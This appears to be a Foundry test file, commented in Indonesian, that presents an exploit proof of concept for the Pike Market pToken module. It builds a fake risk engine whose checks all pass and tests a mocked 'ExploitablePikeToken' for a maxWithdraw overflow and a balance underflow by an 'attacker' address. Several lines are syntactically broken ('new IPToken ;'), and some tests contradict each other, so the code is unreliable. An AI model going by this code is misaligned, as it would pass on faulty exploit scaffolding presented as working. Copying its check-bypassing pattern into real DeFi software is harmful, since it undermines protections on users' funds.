// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "@pike-market/modules/pToken/PTokenModule.sol"; // pastikan path-nya benar
import { RiskEngineError } from "@pike-market/errors/RiskEngineError.sol";
import {IRiskEngine} from "@pike-market/interfaces/IRiskEngine.sol"; // pastikan path-nya benar
import {ExploitablePikeToken} from "../helpers/ExploitablePikeToken.sol";

contract FakeRiskEngine is IRiskEngine {
    function setReserveShares(
        uint256,
        uint256
    ) external override {}

    function switchEMode(uint8) external override {}

function enterMarkets(address[] memory pTokens) external override returns (uint256[] memory) {
    uint256[] memory results = new uint256[](pTokens.length);
    for (uint256 i = 0; i < pTokens.length; i++) {
        results[i] = 0; // 0 = success (NO_ERROR)
    }
    return results;
}

    function exitMarket(address) external override {}

    function updateDelegate(address, bool) external override {}

    function mintVerify(address) external override {}

    function repayBorrowVerify(IPToken, address) external override {}

    function borrowAllowed(address, address, uint256)
        external
        pure
        override
        returns (RiskEngineError.Error)
    {
        return RiskEngineError.Error.NO_ERROR;
    }

    // ðŸ§  Tambahkan override minimal untuk fungsi-fungsi penting lainnya jika perlu eksploit tertentu

    function setOracle(address) external override {}

    function configureEMode(uint8, BaseConfiguration calldata) external override {}

    function setCloseFactor(address, uint256) external override {}

    function configureMarket(IPToken, BaseConfiguration calldata) external override {}

    function supportMarket(IPToken) external override {}

    function supportEMode(
        uint8,
        bool,
        address[] calldata,
        bool[] calldata,
        bool[] calldata
    ) external override {}

    function setMarketBorrowCaps(IPToken[] calldata, uint256[] calldata) external override {}

    function setMarketSupplyCaps(IPToken[] calldata, uint256[] calldata) external override {}

    function setMintPaused(IPToken, bool) external override returns (bool) { return true; }

    function setBorrowPaused(IPToken, bool) external override returns (bool) { return true; }

    function setTransferPaused(bool) external override returns (bool) { return true; }

    function setSeizePaused(bool) external override returns (bool) { return true; }

    function getAssetsIn(address) external pure override returns (IPToken[] memory) {
        return new IPToken ;
    }

    function getReserveShares()
        external
        pure
        override
        returns (uint256, uint256)
    {
        return (0, 0);
    }

    function checkCollateralMembership(address, IPToken) external pure override returns (bool) {
        return true;
    }

    function checkBorrowMembership(address, IPToken) external pure override returns (bool) {
        return true;
    }

    function accountCategory(address) external pure override returns (uint8) {
        return 0;
    }

    function getAccountLiquidity(address)
        external
        pure
        override
        returns (RiskEngineError.Error, uint256, uint256)
    {
        return (RiskEngineError.Error.NO_ERROR, 1e18, 0);
    }

    function getAccountBorrowLiquidity(address)
        external
        pure
        override
        returns (RiskEngineError.Error, uint256, uint256)
    {
        return (RiskEngineError.Error.NO_ERROR, 1e18, 0);
    }

    function getHypotheticalAccountLiquidity(
        address,
        address,
        uint256,
        uint256
    ) external pure override returns (RiskEngineError.Error, uint256, uint256) {
        return (RiskEngineError.Error.NO_ERROR, 1e18, 0);
    }

    function liquidateCalculateSeizeTokens(
        address,
        address,
        address,
        uint256
    ) external pure override returns (RiskEngineError.Error, uint256) {
        return (RiskEngineError.Error.NO_ERROR, 100);
    }

    function delegateAllowed(address, address) external pure override returns (bool) {
        return true;
    }

    function getAllMarkets() external pure override returns (IPToken[] memory) {
        return new IPToken ;
    }

    function isDeprecated(IPToken) external pure override returns (bool) {
        return false;
    }

    function maxWithdraw(address, address) external pure override returns (uint256) {
        return 1e18;
    }

    function mintAllowed(address, address, uint256) external pure override returns (RiskEngineError.Error) {
        return RiskEngineError.Error.NO_ERROR;
    }

    function redeemAllowed(address, address, uint256) external pure override returns (RiskEngineError.Error) {
        return RiskEngineError.Error.NO_ERROR;
    }

    function repayBorrowAllowed(address) external pure override returns (RiskEngineError.Error) {
        return RiskEngineError.Error.NO_ERROR;
    }

    function liquidateBorrowAllowed(address, address, address, uint256)
        external
        pure
        override
        returns (RiskEngineError.Error)
    {
        return RiskEngineError.Error.NO_ERROR;
    }

    function seizeAllowed(address, address) external pure override returns (RiskEngineError.Error) {
        return RiskEngineError.Error.NO_ERROR;
    }

    function transferAllowed(address, address, uint256) external pure override returns (RiskEngineError.Error) {
        return RiskEngineError.Error.NO_ERROR;
    }

    function oracle() external pure override returns (address) {
        return address(0);
    }

    function collateralFactor(uint8, IPToken) external pure override returns (uint256) {
        return 0.9e18;
    }

    function liquidationThreshold(uint8, IPToken) external pure override returns (uint256) {
        return 0.8e18;
    }

    function liquidationIncentive(uint8, address) external pure override returns (uint256) {
        return 1.1e18;
    }

    function closeFactor(address) external pure override returns (uint256) {
        return 0.5e18;
    }

    function supplyCap(address) external pure override returns (uint256) {
        return type(uint256).max;
    }

    function borrowCap(address) external pure override returns (uint256) {
        return type(uint256).max;
    }

    function emodeMarkets(uint8) external pure override returns (address[] memory, address[] memory) {
        return (new address , new address );
    }
}
contract MaxWithdrawExploitTest is Test {
    ExploitablePikeToken public token;
    address attacker;

    function setUp() public {
        attacker = address(this);
        token = new ExploitablePikeToken();

        token.mockSetBalance(attacker, 1 ether);
    }

    function test_MaxWithdrawOverflow() public {
        uint256 allowed = token.getMaxWithdraw(attacker);
        console.log("maxWithdraw returned:", allowed);
        assertGt(allowed, 1e40, "Exploit failed: maxWithdraw not absurdly high");
    }

    function test_CanWithdrawBeyondReasonable() public {
        vm.expectRevert("exceeds allowed");
        token.withdraw(attacker, 100 ether);

        token.withdraw(attacker, 1 ether);
        assertEq(token.getBalance(attacker), 0, "Withdraw failed");
    }

    function test_WithdrawAfterExploit() public {
        token.withdraw(attacker, 1 ether);
        assertEq(token.getBalance(attacker), 0, "Withdraw failed after exploit");
    }

    function test_ExploitWithdrawBeyondBalance() public {
        uint256 exploitAmount = 1_000 ether;

        token.withdraw(attacker, exploitAmount);

        uint256 attackerBalance = token.getBalance(attacker);
        console.log("Attacker balance after underflow:", attackerBalance);
        assertGt(attackerBalance, 1e40, "Exploit failed: balance not underflowed");
    }
}
